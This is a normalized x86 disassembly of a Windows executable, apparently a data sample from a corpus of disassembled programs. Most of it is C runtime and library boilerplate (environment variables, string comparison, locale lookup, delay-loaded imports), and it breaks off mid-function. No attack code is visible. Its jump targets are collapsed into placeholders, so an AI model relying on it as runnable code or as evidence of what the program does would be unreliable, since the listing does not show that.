cmp eax ebx
push edi
mov [ ebp - 0x10 ] ebx
jne r-xdata
push esi
mov esi [ eax ]
cmp esi ebx
mov [ ebp - 0x4 ] esi
je r-xdata
call sub_411077
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_411077
mov [ eax ] 0x16
push 0x3d
push esi
call sub_4111f7
cmp eax ebx
pop ecx
pop ecx
mov [ ebp - 0xc ] eax
je r-xdata
pop edi
pop ebx
leave
retn
cmp esi eax
je r-xdata
xor ecx ecx
cmp [ eax + 0x1 ] bl
mov eax [ rw-data ]
sete cl
cmp eax [ rw-data ]
mov [ ebp - 0x8 ] ecx
jne r-xdata
cmp eax ebx
jne r-xdata
mov edi eax
call sub_41ffca
mov [ rw-data ] eax
mov esi [ rw-data ]
cmp esi ebx
mov [ ebp - 0x14 ] esi
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
mov edi [ ebp - 0xc ]
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_41ff7d
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_417499
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_41d6e1
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40f613
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_40f613
cmp [ ebp - 0x8 ] ebx
pop ecx
jne r-xdata
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_417499
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x14 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_41756c
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_41756c
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_4108e0
inc eax
pop ecx
inc eax
push eax
call sub_4174d9
mov edi eax
cmp edi ebx
pop ecx
pop ecx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_40f613
pop ecx
push esi
push esi
call sub_4108e0
inc eax
pop ecx
inc eax
push eax
push edi
call sub_410677
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0xc ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
push edi
call sub_40f613
pop ecx
or [ ebp - 0x10 ] 0xffffffff
call sub_411077
mov [ eax ] 0x2a
sub_420270
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4202d1
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
cmp edi esi
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
test ebx ecx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
cmp [ ebp - 0x14 ] ebx
mov [ eax ] edi
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
cmp esi ecx
mov [ ebp - 0x10 ] edx
jb r-xdata
inc [ eax + 0x8 ]
test esi esi
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
test ebx ebx
mov [ eax + 0x4 ] esi
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
test edx edx
mov [ eax + 0x4 ] ecx
je r-xdata
sub_42049d
push 0x8
push r--data
call sub_4106dc
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_410721
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_42050f
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_41d1c3
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
mov eax [ rw-data ]
jne r-xdata
xor eax eax
push edi
call sub_41109d
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x54 ] 0x1
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_41d1c3
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x2c ] 0x1
je r-xdata
push 0x2
call sub_41d1c3
push 0x1
mov edi eax
call sub_41d1c3
cmp eax edi
pop ecx
pop ecx
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_41d142
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
test edi edi
mov eax [ eax * 4 + rw-data ]
pop ecx
mov [ eax + esi + 0x4 ] 0x0
je r-xdata
sub_4205a3
push 0x10
push r--data
call sub_4106dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41108a
and [ eax ] 0x0
call sub_411077
mov [ eax ] 0x9
call sub_41108a
mov [ eax ] edi
call sub_411077
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_410721
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41d234
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_411077
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_42050f
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420666
mov eax [ ebp - 0x1c ]
sub_420670
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40f613
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4206c6
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
call [ GetThreadLocale@IAT ]
push 0x7
lea ecx [ ebp - 0xc ]
push ecx
push 0x1004
push eax
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
call [ GetACP@IAT ]
mov esi eax
mov cl [ ebp - 0xc ]
test cl cl
lea eax [ ebp - 0xc ]
je r-xdata
imul esi esi 0xa
movsx ecx cl
inc eax
lea esi [ esi + ecx - 0x30 ]
mov cl [ eax ]
test cl cl
jne r-xdata
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_40f589
leave
retn
sub_42072f
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x98 ]
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
mov eax sub_4206c6
cmp [ ebp - 0x94 ] 0x5
mov eax sub_42072b
jae r-xdata
push eax
push rw-data
call [ InterlockedExchange@IAT ]
call [ rw-data ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f589
leave
retn
sub_420815
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call sub_40f613
and [ esi ] 0x0
pop ecx
sub_420832
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ ecx + 0x4 ]
jge r-xdata
mov ecx [ ecx ]
lea eax [ ecx + eax * 2 ]
retn 0x4
sub_420873
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax 0x80070057
jmp r-xdata
xor eax eax
cmp eax 0x2c
jne r-xdata
pop esi
retn 0x8
push edi
xor edi edi
cmp [ esi + 0x24 ] edi
jle r-xdata
lea ecx [ esi + 0x20 ]
call sub_420815
lea eax [ esi + 0x4 ]
push eax
call [ DeleteCriticalSection@IAT ]
and [ esi ] 0x0
pop edi
push ebx
lea ebx [ esi + 0x20 ]
push edi
mov ecx ebx
call sub_420832
movzx eax [ eax ]
push [ esp + 0x14 ]
push eax
call [ UnregisterClassA@IAT ]
inc edi
cmp edi [ esi + 0x24 ]
jl r-xdata
pop ebx
sub_420903
push esi
mov esi ecx
call sub_420859
push esi
mov [ esi ] 0x2c
call sub_4207f2
test eax eax
jge r-xdata
mov eax esi
pop esi
retn
mov [ rw-data ] 0x1
and [ esi ] 0x0
sub_420929
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x74 ] eax
push esi
mov esi ecx
call sub_4208d3
mov eax __dos_header
push 0x94
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x20 ]
push 0x0
push eax
mov [ esi ] 0x3c
mov [ esi + 0xc ] 0x0
call sub_4109d0
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] 0x94
call [ GetVersionExA@IAT ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
cmp [ ebp - 0x1c ] 0x5
jb r-xdata
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x800
mov [ esi + 0x14 ] r--data
call sub_4207a7
test eax eax
jge r-xdata
cmp [ ebp - 0x1c ] 0x4
ja r-xdata
jmp r-xdata
mov ecx [ ebp + 0x74 ]
mov eax esi
xor ecx ebp
pop esi
call sub_40f589
add ebp 0x78
leave
retn
mov [ rw-data ] 0x1
mov [ esi + 0xc ] 0x1
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
sub_420a21
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov eax __dos_header
push esi
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov ebx [ esi + 0xc ]
add edx eax
push edi
mov edi [ esi + 0x14 ]
add edi eax
add ecx eax
mov [ ebp - 0x18 ] edx
mov edx [ esi + 0x10 ]
add ebx eax
add edx eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x38 ] ecx
xor ecx ecx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x3c ] eax
xor eax eax
test [ esi ] 0x1
lea edi [ ebp - 0x30 ]
mov [ ebp - 0x44 ] 0x24
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x34 ] ecx
stosd [ edi ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
mov eax [ ebp + 0xc ]
sub eax ebx
sar eax 0x2
shl eax 0x2
add edx eax
mov edx [ edx ]
mov [ ebp + 0x8 ] eax
mov eax edx
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x34 ] eax
lea eax [ edx + r--data ]
jne r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x1
push ecx
push 0xc06d0057
call [ RaiseException@IAT ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
xor ebx ebx
cmp eax ecx
je r-xdata
movzx eax dx
pop edi
pop esi
pop ebx
leave
retn 0x8
test edi edi
jne r-xdata
lea edx [ ebp - 0x44 ]
push edx
push ecx
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x2
call eax
mov ebx eax
push [ ebp - 0x38 ]
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x1
call eax
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp - 0x44 ]
push ecx
push 0x5
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] ebx
call eax
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
push edi
push [ ebp - 0x18 ]
call [ InterlockedExchange@IAT ]
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ ebp - 0x30 ]
push edi
call [ GetProcAddress@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ esi + 0x1c ] ebx
je r-xdata
push edi
call [ FreeLibrary@IAT ]
cmp [ esi + 0x18 ] 0x0
je r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x1
push 0x0
push 0xc06d007e
call [ RaiseException@IAT ]
mov eax [ ebp - 0x28 ]
jmp r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x3
call eax
mov edi eax
test edi edi
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ edi + 0x3c ]
add eax edi
cmp [ eax ] 0x4550
jne r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x4
call eax
mov ebx eax
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
mov [ eax + 0x4 ] esi
mov ecx [ rw-data ]
mov [ eax ] ecx
mov [ rw-data ] eax
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push ebx
push 0xc06d007f
call [ RaiseException@IAT ]
mov ebx [ ebp - 0x28 ]
cmp edi [ eax + 0x34 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx + eax ]
test ebx ebx
jne r-xdata
sub_4212f1
mov ecx rw-data
call sub_40e9db
xor eax eax
push sub_42153f
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] eax
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_410412
pop ecx
retn
sub_421359
mov ecx rw-data
call sub_40e9db
xor eax eax
push sub_421549
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] 0x1
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_410412
pop ecx
retn
sub_4213c6
mov ecx rw-data
call sub_40e9db
or [ rw-data ] 0xffffffff
xor eax eax
push sub_421553
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_410412
pop ecx
retn
sub_421430
mov ecx rw-data
call sub_40e9db
xor eax eax
push sub_42155d
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] 0xfffffffe
mov [ rw-data ] al
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_410412
pop ecx
retn
sub_401000
mov eax [ esp + 0x4 ]
cmp eax 0x50
ja r-xdata
jmp sub_4054e9
movzx ecx [ eax + lookup_table_401034 ]
jmp [ ecx * 4 + jump_table_401024 ]
jmp sub_4054cf
retn
sub_401090
mov eax [ esp + 0x4 ]
cmp eax 0x8007000e
jne r-xdata
push eax
call sub_406d9d
call sub_4054cf
sub_4016e0
xor ecx ecx
mov eax rw-data
lea eax [ ecx + 0x1 ]
retn
add eax 0x20
add ecx 0x1
cmp eax rw-data
jl r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
retn
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
UpdateDriverForPlugAndPlayDevicesA
jmp [ UpdateDriverForPlugAndPlayDevicesA@IAT ]
j_sub_4054cf
jmp sub_4054cf
sub_40540f
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_40541d
mov eax [ ecx ]
jmp [ eax + 0x10 ]
sub_405494
mov eax r--data
retn
sub_40549a
mov eax r--data
retn
sub_4054a0
mov eax r--data
retn
sub_4054cf
push ebp
mov ebp esp
push ecx
push r--data
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] rw-data
call sub_40fe0c
int3
sub_4054e9
push ebp
mov ebp esp
push ecx
push r--data
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] rw-data
call sub_40fe0c
int3
sub_405532
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4102df
push eax
call sub_401000
add esp 0x14
retn
sub_405551
push [ esp + 0x4 ]
call j_sub_40f613
pop ecx
retn 0x4
sub_40555e
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_405568
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_4055c6
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_4055e3
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_405600
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_40561d
xor eax eax
retn 0x10
sub_405622
mov eax r--data
retn
sub_405628
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_410677
push eax
call sub_401000
add esp 0x10
retn
sub_405776
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
push 0x80070057
call sub_401090
mov edx [ ecx ]
cmp eax [ edx - 0x8 ]
jg r-xdata
mov [ edx - 0xc ] eax
mov ecx [ ecx ]
mov [ eax + ecx ] 0x0
retn 0x4
sub_40579c
call [ rw-data ]
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ecx
push eax
call [ WideCharToMultiByte@IAT ]
retn
sub_4057b9
xor eax eax
push eax
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x20 ]
push [ esp + 0x20 ]
push eax
call [ rw-data ]
push eax
call [ WideCharToMultiByte@IAT ]
retn
sub_4057dc
push 0x8007000e
call sub_401090
sub_405c2a
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esi + 0xc ]
pop esi
jmp sub_405aab
push eax
call [ CloseHandle@IAT ]
or [ esi + 0x4 ] 0xffffffff
sub_405c49
push esi
mov esi ecx
call sub_4082df
push eax
mov ecx esi
call sub_405b13
mov eax esi
pop esi
retn
sub_405c5d
mov ecx [ ecx ]
sub ecx 0x10
jmp sub_4056ce
sub_405c91
push esi
mov esi ecx
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_405c49
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn
sub_405ea0
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_4072d9
test eax eax
je r-xdata
pop esi
retn 0x4
push [ esp + 0x8 ]
mov ecx esi
push eax
call sub_405d22
sub_405ec0
mov edx [ esp + 0x4 ]
xor al al
test edx edx
je r-xdata
retn 0x4
test edx 0xffff0000
jne r-xdata
movzx eax dx
push eax
call sub_405ea0
mov al 0x1
sub_406030
push esi
mov esi ecx
call sub_405f18
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_4061ee
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_406077
retn 0x8
sub_40624a
cmp [ esp + 0x4 ] 0x0
je r-xdata
call sub_4054e9
add ecx 0xc
jmp sub_405ee0
sub_4065fc
sub esp 0x24
lea eax [ esp ]
push eax
call sub_4065bc
test eax eax
je r-xdata
xor eax eax
mov eax [ eax + 0x14 ]
add eax 0x76c
jmp r-xdata
add esp 0x24
retn
sub_40661c
sub esp 0x24
lea eax [ esp ]
push eax
call sub_4065bc
test eax eax
je r-xdata
xor eax eax
mov eax [ eax + 0x10 ]
inc eax
jmp r-xdata
add esp 0x24
retn
sub_406638
sub esp 0x24
lea eax [ esp ]
push eax
call sub_4065bc
test eax eax
je r-xdata
xor eax eax
mov eax [ eax + 0xc ]
jmp r-xdata
add esp 0x24
retn
sub_406653
sub esp 0x24
lea eax [ esp ]
push eax
call sub_4065bc
test eax eax
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x8 ]
jmp r-xdata
add esp 0x24
retn
sub_40666f
sub esp 0x24
lea eax [ esp ]
push eax
call sub_4065bc
test eax eax
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
jmp r-xdata
add esp 0x24
retn
sub_40668b
sub esp 0x24
lea eax [ esp ]
push eax
call sub_4065bc
test eax eax
je r-xdata
or eax 0xffffffff
mov eax [ eax ]
jmp r-xdata
add esp 0x24
retn
sub_406d62
mov eax r--data
retn
sub_406d87
push esi
mov esi ecx
call sub_40555e
and [ esi + 0x8 ] 0x0
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_406e3a
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_406ef3
push esi
call sub_407eab
push 0x0
mov esi eax
call sub_4086ff
push [ esp + 0x8 ]
lea ecx [ esi + 0x1c ]
call sub_4073e6
push 0x0
call sub_40876c
pop esi
retn 0x4
sub_406f19
call sub_407976
mov eax [ eax + 0xec ]
retn
sub_406fbc
call sub_40878c
test eax eax
je r-xdata
xor eax eax
retn
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
sub_4072d9
call sub_407eab
mov eax [ eax + 0xc ]
retn 0x4
sub_4072fc
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
jmp [ LocalFree@IAT ]
sub_407398
push 0x10
call sub_40876c
push 0x0
push 0x0
call sub_40fe0c
int3
sub_4073d0
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
add eax [ esp + 0x4 ]
retn 0x4
call sub_4054e9
sub_4073e6
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
